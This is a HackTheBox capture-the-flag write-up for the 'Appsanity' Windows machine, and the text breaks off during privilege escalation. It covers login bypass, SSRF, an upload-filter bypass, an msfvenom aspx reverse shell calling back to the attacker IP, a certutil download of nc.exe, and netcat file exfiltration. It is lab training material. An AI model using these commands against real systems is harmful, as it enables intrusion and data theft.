<!doctype html><html lang=en><head><title>'Appsanity' Machine HTB WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="'Appsanity' HTB Machine WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="'Appsanity' Machine HTB WriteUp"><meta name=twitter:description content="'Appsanity' HTB Machine WriteUp"><meta property="og:title" content="'Appsanity' Machine HTB WriteUp"><meta property="og:description" content="'Appsanity' HTB Machine WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/appsanity/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-08T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-08T00:00:00+00:00"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/appsanity/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/appsanity/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/appsanity/>'Appsanity' Machine HTB WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-03-08T00:00:00Z>8 March, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
15-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/windows/>windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/hard/>hard</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/winrm/>winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/cookie-bypass/>cookie bypass</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/evil-winrm/>evil-winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/powershell/>powershell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/cmd/>cmd</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/reverse-engineering/>reverse engineering</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/dnspy/>dnspy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/ghidra/>ghidra</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/burpsuite/>burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/crackmapexec/>crackmapexec</a></span></div></div></header><div class=post-content><h1 id=appsanity-machine>&ldquo;Appsanity&rdquo; Machine
<a class=heading-link href=#appsanity-machine><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty: <em>Hard</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img src=/pentesting/images/Appsanity_avatar.png alt="&lsquo;Appsanity&rsquo; Avatar"></p><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li><code>Nmap</code> scan shows 3 ports open: <code>80</code> <code>HTTP</code>, <code>443</code> <code>HTTPs</code>, and <code>5895</code> <code>Windows Remote Management (WinRM)</code>.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>#</span> Nmap 7.94SVN scan initiated Thu Mar  <span class=m>7</span> 22:16:14 <span class=m>2024</span> as: nmap -sVC -p80,443,5985,7680 -oN targeted 10.10.11.238
</span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.238
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.20s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE    VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp   open  http       Microsoft IIS httpd 10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to https://meddigi.htb/
</span></span></span><span class=line><span class=cl><span class=go>443/tcp  open  https?
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span></code></pre></div><ul><li>From <code>Nmap</code> scan I can see that it redirects to <code>meddigi.htb</code>. So I append this host to my <code>/etc/hosts</code> file:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo echo &#39;10.10.11.238 meddigi.htb&#39; &gt;&gt; /etc/hosts
</span></span></span></code></pre></div><ul><li>Visiting <code>https://meddigi.htb</code> (and after accepting the risk and continue, since this is a self-signed certificated page) I can see a webpage that offer medical services:
<img src=/pentesting/images/Appsanity_1.png alt="Appsanity image 1"></li><li>I can see at the top right of the page that I can sign in with an account. I try with the classical <code>admin:admin</code> credentials and other stuffs, but did not work.</li><li>I create a user, log in and see something like the following:
<img src=/pentesting/images/Appsanity_2.png alt="Appsanity image 2"></li><li>I keep analyzing the page, but nothing interesting</li><li>Now, I will try to find <code>Virtual Hostings (Vhosts)</code> with <code>ffuf</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://meddigi.htb/ -H &#39;Host: FUZZ.meddigi.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : https://meddigi.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.meddigi.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>portal                  [Status: 200, Size: 2976, Words: 1219, Lines: 57, Duration: 2833ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [4989/4989] :: Job [1/1] :: 60 req/sec :: Duration: [0:01:27] :: Errors: 0 ::
</span></span></span></code></pre></div><p>and we find something: <code>portal</code>. So I will add <code>portal.meddigi.htb</code> in the same line I previously added <code>meddigi.htb</code> in my <code>/etc/hosts</code> file, so it looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>127.0.0.1       localhost
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.238 meddigi.htb portal.meddigi.htb
</span></span></span></code></pre></div><ul><li>After adding this site to my <code>/etc/hosts</code> file site I visit <code>https://portal.meddigi.htb</code> and can see a login portal:
<img src=/pentesting/images/Appsanity_3.png alt="Appsanity image 3">
Apparently, it is a portal made for the doctors that work into the company to log in</li><li>Back to <code>https://meddigi.htb</code> site I try create a new account, but this time I will intercept the account creation request with <code>Burpsuite</code>. I note that when I create the account I see a parameter in the request called <code>Acctype</code>, which is by default set to <code>1</code>. So I change that value to <code>Acctype=2</code> and keep all the other parameters exactly the same.
<img src=/pentesting/images/Appsanity_4.png alt="Appsanity image 4"></li><li>I go back to <code>https://meddigi.htb</code> go to <code>Sign In</code>, but now I log in with the new created user called <code>testTwo</code> (since the site does not accept numbers for <code>First Name</code> and <code>Last Name</code> parameters). Now, my panel is slightly different, since I can see, at the right side, a new <code>Patients</code> option that displays the users I have previously created when I was testing this site:
<img src=/pentesting/images/Appsanity_5.png alt="Appsanity image 5.png">
so it seems that we have successfully created a user with a <code>Doctor</code> role (or something similar)</li><li>However, apparently I can only see users (patients) and nothing else</li><li>Back to <code>https://portal.meddigi.htb</code> I check the cookies. In <code>Firefox</code> I do the following: <code>Right Click -> Inspect -> Storage</code>. But I see no cookies/stored items. However, If I click on the plus <code>+</code> symbol at the right (If I put my mouse above it it says <code>Add Item</code>) I can add/modify the stored data.
<img src=/pentesting/images/Appsanity_7.png alt="Appsanity image 7"></li><li>What if we add the cookies/stored items from <code>https://meddigi.htb</code> website with our created Doctor user in this site? So I take my cookies from <code>https://meddigi.htb</code>
<img src=/pentesting/images/Appsanity_6.png alt="Appsanity image 6">
I copy <code>access_token</code> value and pass it to <code>https://portal.meddigi.htb</code>:
<img src=/pentesting/images/Appsanity_8.png alt="Appsanity image 8"></li><li>I reload the page and we are in. So we have bypassed the login:
<img src=/pentesting/images/Appsanity_9.png alt="Appsanity image 9"></li><li>Once in I can see many options available at the left side. <code>Issue Prescriptions</code> calls my attention since I can fill it with some data. After many attempts and stuff, I can see that we can make a <code>Server-Side Request Forgery (SSRF)</code> if we call <code>http://127.0.0.1:8080</code> at <code>Prescription Link</code> field:
<img src=/pentesting/images/Appsanity_10.png alt=Appsanity_10.png>
where I get reports from other doctors. If I click on <code>Submit</code> I can see the reports on an emergent window.</li><li>From the <code>SSRF</code> emergent window I note that, when I put my mouse above <code>View Report</code>, the server interprets <code>aspx</code> files since we have the parameter <code>ViewReport.aspx</code>. For this reason I create a malicious <code>.aspx</code> file with <code>msfvenom</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f aspx -o shell.aspx
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span></span><span class=line><span class=cl><span class=go>No encoder specified, outputting raw payload
</span></span></span><span class=line><span class=cl><span class=go>Payload size: 460 bytes
</span></span></span><span class=line><span class=cl><span class=go>Final size of aspx file: 3425 bytes
</span></span></span><span class=line><span class=cl><span class=go>Saved as: shell.aspx
</span></span></span></code></pre></div><p>where <code>10.10.16.6</code> is my attacker IP and <code>443</code> is the port I will start listening with <code>netcat</code>. I will call this file <code>shell.aspx</code></p><ul><li>At the left side, I click on <code>Upload Reports</code>, fill those fields with any/random data, but append a the malicious <code>shell.aspx</code> file and try to upload it</li><li>At the beginning it does not work since, apparently, there is some type of filter being applied. So I intercept the uploaded file with <code>Burpsuite</code>, and, at the beginning of the payload I will add the magic byte <code>%PDF-1.7</code> and the file is apparently uploaded.
<img src=/pentesting/images/Appsanity_10_5.png alt="Bypass PDF"></li><li>If I go back to <code>Issue Prescriptions</code>, fill <code>Email address</code> fields with anything and <code>Prescription Link</code> with <code>http://127.0.0.1:8080</code> to exploit the <code>SSRF</code> I can see the following; the uploaded malicious file:
<img src=/pentesting/images/Appsanity_11.png alt="Checking malicious file">
where, at the bottom left of the image, we can see the link that it is calling when we click on it.</li><li>On my report (<code>View Report</code> link), I right click on it and click on <code>Copy Link</code> where I get:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>https://portal.meddigi.htb/ViewReport.aspx?file=7b6ed9d4-8963-4d79-9189-abd49df52ad1_shell.aspx
</span></span></code></pre></div><p>but since I want to exploit the <code>SSRF</code>, I will change <code>https://portal.meddigi.htb</code> to <code>http://127.0.0.1:8080</code>, so this string variable becomes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://127.0.0.1:8080/ViewReport.aspx?file=7b6ed9d4-8963-4d79-9189-abd49df52ad1_shell.aspx
</span></span></code></pre></div><ul><li>Finally, I start a <code>netcat</code> listener on port <code>443</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 443
</span></span></span></code></pre></div><p>and in the webpage, in <code>Prescription Link</code> field, I pass the link above:
<img src=/pentesting/images/Appsanity_12.png alt=Appsanity_12.png>
click on <code>Submit</code></p><ul><li>And I get a reverse shell:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.238] 51532
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.19045.3570]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>c:\windows\system32\inetsrv&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>appsanity\svc_exampanel
</span></span></span></code></pre></div><p>and we can get the flag at <code>svc_exampanel</code> Desktop.</p><h2 id=nt-authoritysystem---administrator>NT Authority/System - Administrator
<a class=heading-link href=#nt-authoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>This user does not have interesting permissions:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users&gt;whoami /priv
</span></span></span><span class=line><span class=cl><span class=go>whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                          State
</span></span></span><span class=line><span class=cl><span class=go>============================= ==================================== ========
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeShutdownPrivilege           Shut down the system                 Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeAuditPrivilege              Generate security audits             Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeUndockPrivilege             Remove computer from docking station Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeTimeZonePrivilege           Change the time zone                 Disabled
</span></span></span></code></pre></div><p>so I discard that at the moment</p><ul><li>I can see an <code>inetpub</code> directory located at <code>C:\</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\&gt;dir
</span></span></span><span class=line><span class=cl><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is F854-971D
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of c:\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>09/24/2023  01:25 AM    &lt;DIR&gt;          inetpub
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  10:30 AM    &lt;DIR&gt;          Microsoft
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  01:14 AM    &lt;DIR&gt;          PerfLogs
</span></span></span><span class=line><span class=cl><span class=go>10/23/2023  03:59 PM    &lt;DIR&gt;          Program Files
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  03:59 PM    &lt;DIR&gt;          Program Files (x86)
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  07:28 PM    &lt;DIR&gt;          Users
</span></span></span><span class=line><span class=cl><span class=go>10/23/2023  11:40 AM    &lt;DIR&gt;          Windows
</span></span></span><span class=line><span class=cl><span class=go>               0 File(s)              0 bytes
</span></span></span><span class=line><span class=cl><span class=go>               7 Dir(s)   3,995,791,360 bytes free
</span></span></span></code></pre></div><ul><li>Finally, I get to the folder/directory:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\inetpub\ExaminationPanel\ExaminationPanel\bin&gt;dir
</span></span></span><span class=line><span class=cl><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is F854-971D
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of c:\inetpub\ExaminationPanel\ExaminationPanel\bin
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>09/26/2023  06:30 AM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>09/26/2023  06:30 AM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM         4,991,352 EntityFramework.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM           591,752 EntityFramework.SqlServer.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM            13,824 ExaminationManagement.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM            40,168 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:49 AM    &lt;DIR&gt;          roslyn
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM           431,792 System.Data.SQLite.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM           206,512 System.Data.SQLite.EF6.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:46 AM           206,520 System.Data.SQLite.Linq.dll
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:49 AM    &lt;DIR&gt;          x64
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  07:49 AM    &lt;DIR&gt;          x86
</span></span></span><span class=line><span class=cl><span class=go>               7 File(s)      6,481,920 bytes
</span></span></span><span class=line><span class=cl><span class=go>               5 Dir(s)   3,995,791,360 bytes free
</span></span></span></code></pre></div><ul><li>To transfer files from the target <code>Windows</code> to my <code>Linux</code> machine I will upload <code>netcat</code> binary for <code>Windows</code>. I start a <code>Python</code> <code>HTTP</code> server on port <code>80</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 -m http.server 80
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</span></span></span></code></pre></div><p>and in the target machine (after moving to <code>C:\Users\Public\Downloads\</code>, a directory where I can actually write files) I download the <code>netcat</code> executable using <code>certutil</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\inetpub\ExaminationPanel\ExaminationPanel\bin&gt;cd C:\Users\Public\Downloads
</span></span></span><span class=line><span class=cl><span class=go>cd C:\Users\Public\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;certutil.exe -urlcache -split -f http://10.10.16.6:80/nc.exe .\nc.exe
</span></span></span><span class=line><span class=cl><span class=go>certutil.exe -urlcache -split -f http://10.10.16.6:80/nc.exe .\nc.exe
</span></span></span><span class=line><span class=cl><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  b0d8
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;dir
</span></span></span><span class=line><span class=cl><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is F854-971D
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users\Public\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>03/07/2024  07:57 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  07:57 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  07:57 PM            45,272 nc.exe
</span></span></span><span class=line><span class=cl><span class=go>               1 File(s)         45,272 bytes
</span></span></span><span class=line><span class=cl><span class=go>               2 Dir(s)   3,995,688,960 bytes free
</span></span></span></code></pre></div><ul><li>Now I can transfer the files. More specifically, I will transfer the file <code>ExaminationManagement.dll</code> located at <code>c:\inetpub\ExaminationPanel\ExaminationPanel\bin</code>. In the target machine I run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\nc.exe 10.10.16.6 4444 -w 3 &lt; c:\inetpub\ExaminationPanel\ExaminationPanel\bin\ExaminationManagement.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>.\nc.exe 10.10.16.6 4444 -w 3 &lt; c:\inetpub\ExaminationPanel\ExaminationPanel\bin\ExaminationManagement.dll
</span></span></span></code></pre></div><p>and in my <code>netcat</code> listener I get the file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 4444 &gt; ExaminationManagement.dll
</span></span></span><span class=line><span class=cl><span class=go>listening on [any] 4444 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.238] 51540
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go>total 24
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x  4096 Mar  8 01:03 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 5 gunzf0x gunzf0x  4096 Mar  7 22:12 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 13824 Mar  8 01:03 ExaminationManagement.dll
</span></span></span></code></pre></div><p><em>Note</em>: the connection between the reverse shell obtained through the malicious <code>.aspx</code> might die when we pass files with <code>netcat</code>, so it could be a torture. However, here I note that the size of <code>ExaminationManagement.dll</code> is the same in the target and in my machine, so it should have been transferred well.</p><ul><li>I pass this file from my Kali machine to a Virtual Machine with <code>Windows</code> since I will try to use <code>dnSpy</code> (which we can get from <a href=https://github.com/dnSpy/dnSpy/releases class=external-link target=_blank rel=noopener>its Github releases page</a>) and do some <code>Reverse Engineering</code>. After analyzing the file with <code>dnSpy</code> I can see something interesting at <code>ExaminationPanel -> ViewReport</code>:
<img src=/pentesting/images/Appsanity_13.png alt="Analyzing file with dnspy"></li><li>This <code>.dll</code> file is calling a registry key, that could contain credentials, at <code>Software\\MedDigi</code></li><li>Back to the shell obtained with the <code>SSRF</code> at the portal website, we can try to read this entry:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\windows\system32\inetsrv&gt;reg query HKEY_LOCAL_MACHINE\Software\MedDigi
</span></span></span><span class=line><span class=cl><span class=go>reg query HKEY_LOCAL_MACHINE\Software\MedDigi
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>HKEY_LOCAL_MACHINE\Software\MedDigi
</span></span></span><span class=line><span class=cl><span class=go>    EncKey    REG_SZ    1g0tTh3R3m3dy!!
</span></span></span></code></pre></div><p>and we have, apparently, a password.</p><ul><li>However, we have many users on this machine:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\windows\system32\inetsrv&gt;dir C:\Users
</span></span></span><span class=line><span class=cl><span class=go>dir C:\Users
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is F854-971D
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
